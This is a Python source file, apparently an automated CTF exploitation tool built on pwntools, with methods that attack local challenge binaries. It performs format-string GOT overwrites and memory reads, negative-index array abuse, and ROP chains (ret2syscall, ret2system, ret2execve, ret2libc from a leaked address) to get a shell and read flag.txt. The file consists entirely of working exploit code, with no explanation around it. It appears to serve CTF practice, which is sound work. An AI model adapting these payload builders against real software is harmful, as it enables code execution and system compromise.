from pwn import *
import json

from static import Static
from app import App
from rop import ROP
from dynamic import Dynamic

class Exploits(App):
    def __init__(self, binary):
        super().__init__(binary)

    def got_overwrite(self, binary, function):
        # you have to tell pwntools how to do their bulllllllsheeeettttyytytyytyt
        context.update(
                arch="amd64",
                endian="little"
                )

        s = Static()
        d = Dynamic()

        calls = s.get_calls(function)

        got_call = calls[-1]["disasm"]
        got_call = got_call[got_call.index("call sym.imp.") + len("call sym.imp."):]

        io = process(binary)
        binsh = None

        try:
            binsh = next(self.pwnelf.search(b"/bin/sh"))

        except:
            pass

        offset = d.find_printf_offset(binary)

        # all test binaries want pwnme to be 1337 (0x539), lets hope that doesn't change for the real binaries
        # TODO: ask marcus this
        payload = fmtstr_payload(offset, {self.pwnelf.got[got_call]: self.pwnelf.sym["win"]}, write_size="int") 
        io.sendlineafter(b">>>", payload)

        if binsh:
            io.sendline(b"cat flag.txt")
            io.sendline(b"exit")
        
        flag = io.recvall(1)

        io.close()
        
        if b"flag{" in flag:
            flag = flag[flag.index(b"flag"):]
            return flag[:flag.index(b"}") + 1]    

        return None


    def printf_write_var(self, binary):
        # you have to tell pwntools how to do their bulllllllsheeeettttyytytyytyt
        context.update(
                arch="amd64",
                endian="little"
                )

        d = Dynamic()
        io = process(binary)
        binsh = None

        try:
            binsh = next(self.pwnelf.search(b"/bin/sh"))

        except:
            pass

        offset = d.find_printf_offset(binary)

        # all test binaries want pwnme to be 1337 (0x539), lets hope that doesn't change for the real binaries
        # TODO: ask marcus this
        payload = fmtstr_payload(offset, {self.pwnelf.sym.pwnme: 0x539}, write_size="int") 
        io.sendlineafter(b">>>", payload)

        if binsh:
            io.sendline(b"cat flag.txt")
            io.sendline(b"exit")
        
        flag = io.recvall(1)

        io.close()
        
        if b"flag{" in flag:
            flag = flag[flag.index(b"flag"):]
            return flag[:flag.index(b"}") + 1]    

        return None

        
    
    def printf_read_var(self, binary):
        flag = b""

        for i in range(200):
            io = process(binary)

            io.sendlineafter(b">>>", f"%{i+1}$p".encode())

            out = io.recvall(0.5)

            try:
                out = out[out.index(b"0x"):]
                out = out[:out.index(b"\n")]

                out = int(out, 16).to_bytes(8, "little")

                if b"flag{" in out:
                    flag = out

                elif b"flag{" in flag:
                    if b"}" in out:
                        flag += out[:out.index(b"}") + 1]
                        break

                    flag += out

            except:
                pass

            io.close()

        return flag

    def arrayabuse(self, binary):
        binsh = None
        try:
            binsh = next(self.pwnelf.search(b"/bin/sh"))

        except:
            pass

        for i in range(100):
            io = process(binary)

            io.sendlineafter(b">>>", f"-{i + 1}".encode())

            payload = p64(self.pwnelf.sym["win"]) * 4
            io.sendlineafter(b">>>", payload)

            if binsh:
                io.sendline(b"cat flag.txt")
                io.sendline(b"exit")
            
            flag = io.recvall(0.5)

            io.close()
            
            if b"flag{" in flag:
                return flag[flag.index(b"flag"):flag.index(b"}") + 1]      

        return None


    def ret2syscall(self, binary, syscall, excempt=0, use_angr=False):
        r = ROP()
        d = Dynamic()
        
        io = process(binary)

        binsh = next(self.pwnelf.search(b"/bin/sh"))
        if use_angr:
            payload = d.find_overflow_angr(binary, self.pwnelf.sym["main"])
        else:
            payload = d.find_overflow(binary)

        # in case ret2syscall fails, call it with a different excempt value
        # each value will try to infer that some register that should be null is already null
        if excempt == 0:
            payload += r.generate_rop_chain(self, {"rax": 0x3b, "rdi": binsh, "rsi": 0, "rdx": 0})
        elif excempt == 1:
            payload += r.generate_rop_chain(self, {"rax": 0x3b, "rdi": binsh, "rsi": 0})
        elif excempt == 2:
            payload += r.generate_rop_chain(self, {"rax": 0x3b, "rdi": binsh, "rdx": 0})
        elif excempt == 3:
            payload += r.generate_rop_chain(self, {"rax": 0x3b, "rdi": binsh})
        else:
            print("[!] out of excemptions.")
            return None

        payload += p64(syscall)

        io.sendlineafter(b">>>", payload)

        try:
            io.sendlineafter(b"<<<", b"cat flag.txt")

            flag = io.recvuntil(b"}")
            flag = flag[flag.index(b"flag"):]

            io.close()

            return flag

        except:
            io.close()

            print("[!] ret2syscall did not work.")
            return None


    def ret2system(self, binary, add_ret=True, use_angr=False):
        r = ROP()
        d = Dynamic()

        io = process(binary)

        cat_flag = next(self.pwnelf.search(b"/bin/cat flag.txt"))
        ret = None

        for file, gadget in self.rs.search(search="ret"):
            if "ret;" in str(gadget):
                ret = int(str(gadget).split(":")[0], 16)
                break

        if use_angr:
            payload = d.find_overflow_angr(binary, self.pwnelf.sym["main"])
        else:
            payload = d.find_overflow(binary)


        payload += r.generate_rop_chain(self, {"rdi": cat_flag})

        if add_ret:
            payload += p64(ret)

        payload += p64(self.pwnelf.plt["system"])

        io.sendlineafter(b">>>", payload)

        try:
            flag = io.recvuntil(b"}")
            flag = flag[flag.index(b"flag"):]

            io.close()

            return flag

        except:
            io.close()

            print("[!] ret2system did not work.")
            return None


    def ret2execve(self, binary, use_angr=False):
        r = ROP()
        d = Dynamic()

        io = process(binary)

        try:
            binsh = next(self.pwnelf.search(b"/bin/sh"))

        except:
            io.close()

            print("[!] /bin/sh not found in ret2execve!")
            return None

        if use_angr:
            payload = d.find_overflow_angr(binary, self.pwnelf.sym["main"])
        else:
            payload = d.find_overflow(binary)

        payload += r.generate_rop_chain(self, {"rdi":binsh, "rsi":0, "rdx":0})

        payload += p64(self.pwnelf.plt["execve"])

        io.sendlineafter(b">>>", payload)

        try:
            io.sendline(b"cat flag.txt")
            flag = io.recvuntil(b"}")

            io.close()

            return flag[flag.index(b"flag"):]

        except:
            io.close()

            print("[!] ret2execve failed.")
            return None


    # in my test bins, one_gadget does not want to work
    # ret2libc works though
    def ret2one(self, binary, leaked_function, add_ret=True, use_angr=False):
        d = Dynamic()
        
        io = process(binary)

        io.recvuntil(b"<<< Leak: ")
        leak = io.recvline()
        leak = int(leak[:-1], 16)

        libcoff = leak - self.pwnlibc.sym[leaked_function]

        print(f"[*] Libc offset: {hex(libcoff)}")

        ret = None
        pop_rdi = None

        for file, gadget in self.rs.search(search="ret"):
            if "ret;" in str(gadget):
                ret = int(str(gadget).split(":")[0], 16)
                break

        for file, gadget in self.rs.search(search="pop rdi"):
            if "pop rdi; ret;" in str(gadget):
                pop_rdi = int(str(gadget).split(":")[0], 16)
                break

        if use_angr:
            payload = d.find_overflow_angr(binary, self.pwnelf.sym["main"])
        else:
            payload = d.find_overflow(binary)

        payload += p64(pop_rdi)
        payload += p64(next(self.pwnlibc.search(b"/bin/sh")) + libcoff)

        if add_ret:
            payload += p64(ret)

        payload += p64(self.pwnlibc.sym["system"] + libcoff)

        io.sendlineafter(b">>>", payload)

        try:
            io.sendline(b"cat flag.txt")
            flag = io.recvuntil(b"}")
            flag = flag[flag.index(b"flag"):]

            io.close()

            return flag

        except:
            io.close()

            print("[!] ret2one failed.")
            return None


